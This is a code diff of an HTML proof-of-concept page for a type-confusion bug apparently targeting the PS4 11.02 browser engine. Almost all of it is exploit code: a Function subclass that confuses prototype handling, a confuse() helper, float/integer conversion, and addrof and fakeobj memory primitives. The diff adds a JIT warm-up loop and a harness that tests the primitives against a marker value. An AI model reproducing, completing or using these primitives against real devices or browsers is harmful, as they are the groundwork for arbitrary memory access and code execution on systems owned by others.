@@ -2,11 +2,11 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>PS4 11.02 Type Confusion Test (OOM‑Safe)</title>
+  <title>PS4 11.02 Type Confusion OOM‑Safe</title>
   <style>
     body { background: #000; color: #0f0; font-family: monospace; padding: 1em; }
     #log { white-space: pre-wrap; }
-    .ok { color: #0f0; }
+    .ok  { color: #0f0; }
     .err { color: #f00; }
   </style>
 </head>
@@ -23,29 +23,27 @@
       logDiv.appendChild(line);
     }
 
-    // ——— PoC + primitive definitions ———
+    // ——— PoC class & confuse helper ———
     class MyFunction extends Function {
       constructor() {
         super();
         super.prototype = 1;
       }
     }
-
     function confuse(arr, f) {
-      try {
-        f.__defineGetter__('prototype', () => {});
-      } catch (e) {}
+      try { f.__defineGetter__('prototype', () => {}); } catch (e) {}
       arr[0] = f.prototype;
       return arr[0];
     }
 
+    // ——— Shared structures ———
     const float_arr = [1.1, 2.2, 3.3];
     const obj_arr   = [{}, {}, {}];
 
+    // float<->int conversion
     const buf = new ArrayBuffer(16);
     const f64 = new Float64Array(buf);
     const u32 = new Uint32Array(buf);
-
     function f2i(f) {
       f64[0] = f;
       return u32[0] + u32[1] * 0x100000000;
@@ -56,51 +54,55 @@
       return f64[0];
     }
 
+    // ——— Single confuse function instance ———
+    const confuser = new MyFunction();
+
+    // ——— Primitives using the same instance ———
     function addrof(obj) {
       obj_arr[0] = obj;
-      let leak = confuse(float_arr, new MyFunction());
+      let leak = confuse(float_arr, confuser);
       return f2i(leak);
     }
     function fakeobj(addr) {
       float_arr[0] = i2f(addr);
-      return confuse(obj_arr, new MyFunction());
+      return confuse(obj_arr, confuser);
     }
 
+    // ——— OOM‑Safe warm‑up ———
+    (function warmup() {
+      log("Warm‑up: 2 000 iterations using single function…", 'ok');
+      for (let i = 0; i < 2000; i++) {
+        confuse(float_arr, confuser);
+      }
+      log("Warm‑up complete.", 'ok');
+    })();
+
+    // ——— Test harness ———
     function runTest(id) {
-      const marker = 0x41414100 + id;
+      const marker = 0x414100 + id;
       let o = { marker };
       let addr = addrof(o);
-      log(`[Test ${id}] addrof:    0x${addr.toString(16)}`, 'ok');
+      log(`[Test ${id}] addrof:        0x${addr.toString(16)}`, 'ok');
 
       let f = fakeobj(addr);
       if (typeof f !== 'object') {
-        log(`[Test ${id}] fakeobj result is not object!`, 'err');
+        log(`[Test ${id}] fakeobj not object!`, 'err');
         return;
       }
       let m = f.marker;
       if (m === marker) {
-        log(`[Test ${id}] fake.marker: 0x${m.toString(16)}  ✓`, 'ok');
+        log(`[Test ${id}] fake.marker:   0x${m.toString(16)}  ✓`, 'ok');
       } else {
-        log(`[Test ${id}] fake.marker: 0x${m?.toString(16) || m}  ✗`, 'err');
+        log(`[Test ${id}] fake.marker:   0x${m?.toString(16) || m}  ✗`, 'err');
       }
     }
 
-    // ——— OOM‑Safe warm‑up ———
-    {
-      log("Warming up JIT (2 000 iterations)…", 'ok');
-      let f = new MyFunction();
-      for (let i = 0; i < 2000; i++) {
-        confuse(float_arr, f);
-      }
-      log("Warm‑up complete.", 'ok');
-    }
-
-    // give the GC a moment, then run tests
+    // delay tests to let GC settle
     setTimeout(() => {
-      for (let i = 1; i <= 5; i++) {
+      for (let i = 1; i <= 3; i++) {
         runTest(i);
       }
-    }, 100);
+    }, 200);
   </script>
 </body>
 </html>
